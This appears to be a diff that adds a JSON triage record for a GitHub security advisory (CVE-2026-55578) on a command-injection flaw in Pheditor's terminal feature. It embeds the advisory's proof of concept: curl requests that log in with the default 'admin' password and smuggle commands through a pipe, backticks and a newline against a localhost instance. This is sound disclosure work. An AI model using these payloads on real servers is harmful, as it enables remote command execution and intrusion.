@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/87920408?v=4\", \"events_url\": \"https://api.github.com/users/sondt99/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/sondt99/followers\", \"following_url\": \"https://api.github.com/users/sondt99/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/sondt99/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/sondt99\", \"id\": 87920408, \"login\": \"sondt99\", \"node_id\": \"MDQ6VXNlcjg3OTIwNDA4\", \"organizations_url\": \"https://api.github.com/users/sondt99/orgs\", \"received_events_url\": \"https://api.github.com/users/sondt99/received_events\", \"repos_url\": \"https://api.github.com/users/sondt99/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/sondt99/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/sondt99/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/sondt99\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55578\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\n\\nThe terminal feature in Pheditor uses an incomplete character blocklist to sanitize user-supplied commands before passing them to `shell_exec()`. After the fix for GHSA-9643-6xjp-vx57 (which added `$` to the blocklist), the characters `|` (single pipe), `` ` `` (backtick), and the newline byte (`0x0A`) remain unblocked. An authenticated user with the `terminal` permission (enabled by default) can leverage any of these to bypass the `TERMINAL_COMMANDS` allowlist and execute arbitrary OS commands as the web server user.\\n\\n### Details\\n\\nTested repository: https://github.com/pheditor/pheditor\\n\\nTested commit: `e538f05b6faec99e5b23726bc9c17d6b57774297` (current HEAD on `main`)\\n\\nAffected version: Pheditor 2.0.1+\\n\\nThe terminal handler receives `$_POST['command']` and passes it to `shell_exec()` at `pheditor.php:586`:\\n\\n```php\\n$output = shell_exec((empty($dir) ? null : 'cd ' . escapeshellarg($dir) . ' && ') . $command . ' && echo \\\\ ; pwd');\\n```\\n\\nThe blocklist at `pheditor.php:557` checks for `&`, `;`, `||`, and `$`, but does not block `|`, `` ` ``, or newline (`0x0A`):\\n\\n```php\\nif (strpos($command, '&') !== false || strpos($command, ';') !== false || strpos($command, '||') !== false || strpos($command, '$') !== false) {\\n    echo json_error(\\\"Illegal character(s) in command (& ; ||)\\\\n\\\");\\n    exit;\\n}\\n```\\n\\nThe `TERMINAL_COMMANDS` prefix check at `pheditor.php:566-573` only validates that the command starts with an allowed name. All three bypasses start with a whitelisted command prefix.\\n\\n**Bypass 1 — Single pipe `|`:**\\nThe filter checks for `||` but not single `|`. Payload `ls | id` passes both the blocklist and the whitelist (starts with `ls`). The shell executes: `cd '<dir>' && ls | id && echo \\\\ ; pwd`, running `id`.\\n\\n**Bypass 2 — Backtick `` ` ``:**\\nBacktick is not in the blocklist. Payload `` echo `id` `` passes the blocklist and whitelist (starts with `echo`). The shell executes `id` inside backtick substitution.\\n\\n**Bypass 3 — Newline `0x0A`:**\\nA literal newline byte is not in the blocklist. Payload `ls\\\\ntouch /tmp/proof` (where `\\\\n` is 0x0A) passes both checks. Only the first line is validated against the whitelist. The second line runs as an independent command.\\n\\n### PoC\\n\\n**Environment:** Any system running PHP 8.x with pheditor.php deployed and `shell_exec()` enabled.\\n\\n**Setup:**\\n```bash\\ngit clone https://github.com/pheditor/pheditor /tmp/pheditor-test\\ncd /tmp/pheditor-test\\nphp -S localhost:8080 pheditor.php &\\n```\\n\\n**Authenticate** (default password `admin`):\\n```bash\\ncurl -s -c /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php -d \\\"pheditor_password=admin\\\" -L > /dev/null\\nTOKEN=$(curl -s -b /tmp/cookies.txt http://localhost:8080/pheditor.php | grep -o 'token = \\\"[a-f0-9]*\\\"' | grep -o '\\\"[a-f0-9]*\\\"' | tr -d '\\\"')\\n```\\n\\n**Bypass 1 (pipe `|`):**\\n```bash\\ncurl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \\\\\\n  --data-urlencode \\\"action=terminal\\\" \\\\\\n  --data-urlencode \\\"token=$TOKEN\\\" \\\\\\n  --data-urlencode \\\"command=ls | id\\\" \\\\\\n  --data-urlencode \\\"dir=\\\"\\n```\\nExpected: `{\\\"error\\\":false,\\\"message\\\":\\\"OK\\\",\\\"result\\\":\\\"uid=... gid=...\\\\n\\\",...}` — `id` output proves RCE.\\n\\n**Bypass 2 (backtick):**\\n```bash\\ncurl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \\\\\\n  --data-urlencode \\\"action=terminal\\\" \\\\\\n  --data-urlencode \\\"token=$TOKEN\\\" \\\\\\n  --data-urlencode 'command=echo `id`' \\\\\\n  --data-urlencode \\\"dir=\\\"\\n```\\nExpected: Same `id` output in response.\\n\\n**Bypass 3 (newline 0x0A):**\\n```bash\\ncurl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \\\\\\n  --data-urlencode \\\"action=terminal\\\" \\\\\\n  --data-urlencode \\\"token=$TOKEN\\\" \\\\\\n  --data-urlencode $'command=ls\\\\nid' \\\\\\n  --data-urlencode \\\"dir=\\\"\\n```\\nExpected: Same `id` output in response.\\n\\n**Control (blocked command without bypass):**\\n```bash\\ncurl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \\\\\\n  --data-urlencode \\\"action=terminal\\\" \\\\\\n  --data-urlencode \\\"token=$TOKEN\\\" \\\\\\n  --data-urlencode \\\"command=whoami\\\" \\\\\\n  --data-urlencode \\\"dir=\\\"\\n```\\nExpected: `{\\\"error\\\":true,\\\"message\\\":\\\"Command not allowed...\\\"}` — allowlist enforced.\\n\\n**Cleanup:**\\n```bash\\nkill %1; rm -rf /tmp/pheditor-test /tmp/cookies.txt\\n```\\n\\n### Impact\\n\\nOS Command Injection (CWE-78). Any authenticated Pheditor user with the `terminal` permission (enabled by default) can bypass the `TERMINAL_COMMANDS` allowlist and execute arbitrary OS commands as the web server user. This is a bypass of the partial fix for GHSA-9643-6xjp-vx57 — that fix addressed `$()` substitution but three additional shell metacharacters remain unblocked.\\n\\n**Attacker privileges:** Authenticated user (PR:L). Combined with default password `admin`, effectively PR:N.\\n\\n**Impact:** Full read/write/execute access as the web server user. Confidentiality: High (read any accessible file). Integrity: High (write/delete files, deploy webshells). Availability: High (disrupt services).\\n\\n**Suggested remediation:** Parse the command into executable + arguments, validate the executable against `TERMINAL_COMMANDS` with exact match, pass each argument through `escapeshellarg()`, or use `proc_open()` with an argument array to avoid shell interpretation entirely.\", \"ghsa_id\": \"GHSA-wg4w-wr5q-6vjc\", \"github_reviewed_at\": \"2026-07-16T20:10:47Z\", \"html_url\": \"https://github.com/advisories/GHSA-wg4w-wr5q-6vjc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wg4w-wr5q-6vjc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55578\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-16T20:10:47Z\", \"references\": [\"https://github.com/pheditor/pheditor/security/advisories/GHSA-wg4w-wr5q-6vjc\", \"https://github.com/pheditor/pheditor/releases/tag/2.0.6\", \"https://github.com/advisories/GHSA-wg4w-wr5q-6vjc\"], \"repository_advisory_url\": \"https://api.github.com/repos/pheditor/pheditor/security-advisories/GHSA-wg4w-wr5q-6vjc\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/pheditor/pheditor\", \"summary\": \"Pheditor: Incomplete command sanitization in terminal feature allows RCE via pipe operator, backtick substitution, and newline injection\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-16T20:10:48Z\", \"url\": \"https://api.github.com/advisories/GHSA-wg4w-wr5q-6vjc\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"pheditor/pheditor\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 2.0.1, < 2.0.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wg4w-wr5q-6vjc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pheditor/pheditor: >= 2.0.1, < 2.0.6"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-55578"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pheditor/pheditor"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:54.736175Z",
+  "provenance": {
+    "content_sha256": "fa5043f0025d628a20b017516d315a666aafe0cbf51d3fc5d4500a87df9034b1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-16T20:10:47Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wg4w-wr5q-6vjc",
+  "status": "active",
+  "title": "Pheditor: Incomplete command sanitization in terminal feature allows RCE via pipe operator, backtick substitution, and newline injection",
+  "updated_at": "2026-07-16T20:10:48Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wg4w-wr5q-6vjc"
+}
